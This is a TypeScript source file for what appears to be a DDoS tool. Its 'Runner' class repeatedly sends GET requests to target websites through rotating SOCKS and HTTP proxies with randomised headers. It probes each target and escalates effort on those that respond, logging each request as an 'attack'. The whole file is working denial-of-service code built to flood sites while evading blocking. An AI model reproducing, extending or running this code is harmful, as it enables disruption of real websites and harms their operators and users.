import { EventEmitter } from 'events'
import axios, { AxiosError, AxiosProxyConfig, AxiosRequestConfig } from 'axios-https-proxy-fix'
import { ProxyRequestData, SiteData, PrioritizedTarget } from './types'
import { HttpHeadersUtils } from './utils/httpHeadersUtils'
import { Doser } from './doser'
import SocksAgent from 'axios-socks5-agent'

export class Runner {
  private onlyProxy: boolean
  private readonly ATTACKS_PER_TARGET = 2
  private readonly ATTACKS_PER_PRIORITIZED_TARGET = 32
  private active = false
  public readonly eventSource: EventEmitter
  private requestTimeout = 10000
  private doserInstance: Doser
  private canAddPrioritized: boolean

  constructor (props: { onlyProxy: boolean; doserInstance: Doser }) {
    this.onlyProxy = props.onlyProxy
    this.doserInstance = props.doserInstance
    this.canAddPrioritized = true
    this.eventSource = new EventEmitter()
  }

  stopAddingPrioritized () {
    this.canAddPrioritized = false
  }

  async start () {
    this.active = true
    while (this.active) {
      try {
        this.canAddPrioritized = true
        const pTargets = this.doserInstance.getPrioritizedTargets()
        let pTarget
        let prioritizing = false
        if (pTargets.length > 0 && this.doserInstance.prioritizedWorkersNow < this.doserInstance.maxPrioritizedWorkers) {
          pTarget = pTargets[Math.floor(Math.random() * pTargets.length)]
          if (pTarget) {
            this.doserInstance.removePrioritizedTarget(pTarget.page, pTarget.proxyObj)
            this.doserInstance.prioritizedWorkersNow++
            prioritizing = true
          }
        }
        const priorityTargetsToAdd = await this.sendTroops(pTarget)
        if (priorityTargetsToAdd && this.canAddPrioritized) {
          if (priorityTargetsToAdd[0] && priorityTargetsToAdd[1]) {
            const howMuch = priorityTargetsToAdd[0]
            const targetData = priorityTargetsToAdd[1] as PrioritizedTarget
            for (let index = 0; index < howMuch; index++) {
              if (this.canAddPrioritized) {
                this.doserInstance.addPrioritizedTarget(targetData.page, targetData.proxyObj)
              }
            }
          }
        }
        if (prioritizing) {
          this.doserInstance.prioritizedWorkersNow--
        }
      } catch (error) {
        this.active = false
        throw error
      }
    }
  }

  stop () {
    this.active = false
  }

  setProxyActive (newProxyValue: boolean) {
    this.onlyProxy = newProxyValue
  }

  private async requestMe (target: SiteData, timeout: number, proxyObj?: ProxyRequestData) {
    const axiosconfig = {
      timeout,
      headers: HttpHeadersUtils.generateRequestHeaders(),
      validateStatus: () => true
    } as AxiosRequestConfig

    // Setting up proxy config
    if (proxyObj !== undefined) {
      if (proxyObj.scheme === 'socks4' || proxyObj.scheme === 'socks5') {
        const { httpAgent, httpsAgent } = SocksAgent({
          agentOptions: {
            keepAlive: false,
            timeout
          },
          // socks5
          host: proxyObj.host,
          port: proxyObj.port,
          // socks5 auth
          username: proxyObj.username,
          password: proxyObj.password
        })
        axiosconfig.httpAgent = httpAgent
        axiosconfig.httpsAgent = httpsAgent
      } else {
        const proxyConfig = {
          host: proxyObj.host,
          port: proxyObj.port,
          protocol: proxyObj.scheme
        } as AxiosProxyConfig
        if (proxyObj.username !== undefined && proxyObj.password !== undefined) {
          proxyConfig.auth = {
            username: proxyObj.username,
            password: proxyObj.password
          }
        }
        axiosconfig.proxy = proxyConfig
      }
    }

    try {
      let response
      if (proxyObj) {
        response = await axios.get<void>(target.page, axiosconfig)
        return [response.status, undefined]
      } else {
        response = await axios.get(target.page, {
          timeout: timeout,
          headers: HttpHeadersUtils.generateRequestHeaders(),
          validateStatus: () => true
        })
      }
      return [response.status, undefined]
    } catch (err) {
      const code = (err as AxiosError).code
      const returnErr = (code === undefined) ? (err as any).toString() : (err as AxiosError).code
      console.log(`Requesting ${target.page} with ${proxyObj?.scheme || 'no'} proxy. ${JSON.stringify(proxyObj)}. ${returnErr}`)
      return [-1, returnErr]
    }
  }

  private async sendTroops (prioritizedTarget: PrioritizedTarget | undefined) {
    if (prioritizedTarget) {
      const target = prioritizedTarget.page
      const proxy = prioritizedTarget.proxyObj
      let okReq = 0
      for (let index = 0; index < this.ATTACKS_PER_PRIORITIZED_TARGET; index++) {
        const r = await this.requestMe(target, this.requestTimeout, proxy)
        if (r[0] != -1 && r[0] != undefined && r[0] >= 200) {
          okReq = okReq + 1
        }
        this.eventSource.emit('attack', { url: target.page, log: `${target.page} | ${proxy ? 'PROXY' : 'DIRECT'}PRIORITIZED | ${r[0] == -1 ? '' : r[0]} ${r[1] ? r[1] : r[0] == -1 ? 'Undefined error' : 'OK'}` })
      }
      if (okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 16)) {
        let toAdd = 1
        if (okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 8)) {
          toAdd = toAdd + 1
        }
        if (okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 4)) {
          toAdd = toAdd + 1
        }
        if (okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 2)) {
          toAdd = toAdd + 1
        }
        return [toAdd, { page: target, proxyObj: proxy } as PrioritizedTarget]
      }
      return
    }
    const target = this.doserInstance.sites[Math.floor(Math.random() * this.doserInstance.sites.length)]

    let directRequest = false
    if (!this.onlyProxy) {
      const probe = await this.requestMe(target, this.requestTimeout, undefined)
      directRequest = probe[0]! >= 200 && probe[0] != 407 && probe[0]! < 510
      if (!directRequest) {
        console.debug('DIRECT probing err ', probe[1], 'will use proxy')
        this.eventSource.emit('error', { error: directRequest })
      } else {
        this.eventSource.emit('attack', { url: target.page, log: `${target.page} | DIRECT | ${probe[0]} ${probe[1] != undefined ? probe[1] : ''}` })
        return [3, { page: target, proxyObj: undefined } as PrioritizedTarget]
      }
    }

    let proxy = null

    for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
      if (!this.active) {
        break
      }

      try {
        if (directRequest) {
          // PROBABLY NOT REACHED ANYMORE
          if (this.onlyProxy) {
            console.log('Changing to only proxy')
            break
          }
          const r = await this.requestMe(target, this.requestTimeout, undefined)
          this.eventSource.emit('attack', { url: target.page, log: `${target.page} | DIRECT | ${r[0]} ${r[1] ? r[1] : 'Undefined error'}` })
          if (r[0]! >= 200) {
            return [3, { page: target, proxyObj: undefined } as PrioritizedTarget]
          }
        } else {
          proxy = this.doserInstance.proxies[Math.floor(Math.random() * this.doserInstance.proxies.length)]

          const proxyAddressSplit = proxy.ip.split(':')
          const proxyIP = proxyAddressSplit[0]
          const proxyPort = parseInt(proxyAddressSplit[1])

          const proxyObj: ProxyRequestData = {
            host: proxyIP,
            port: proxyPort,
            scheme: proxy.scheme
          }

          proxyObj.host = proxyIP
          proxyObj.port = proxyPort

          if (proxy.auth) {
            const proxyAuthSplit = proxy.auth.split(':')
            proxyObj.username = proxyAuthSplit[0]
            proxyObj.password = proxyAuthSplit[1]
          }

          const r = await this.requestMe(target, this.requestTimeout, proxyObj)

          this.eventSource.emit('attack', { url: target.page, log: `${target.page} | PROXY | ${r[0] == -1 ? r[1] : r[0]}` })
          if (r[0]! >= 200) {
            return [3, { page: target, proxyObj: proxyObj } as PrioritizedTarget]
          }

          if (r[0] === 407) {
            console.log(proxy)
            proxy = null
          }
        }
      } catch (e) {
        proxy = null
        const code = (e as AxiosError).code || 'UNKNOWN'
        if (code === 'UNKNOWN') {
          console.error(e)
        }

        this.eventSource.emit('attack', { type: 'atack', url: target.page, log: `${target.page} | ${code}` })
        if (code === 'ECONNABORTED') {
          break
        }
      }
    }
  }
}
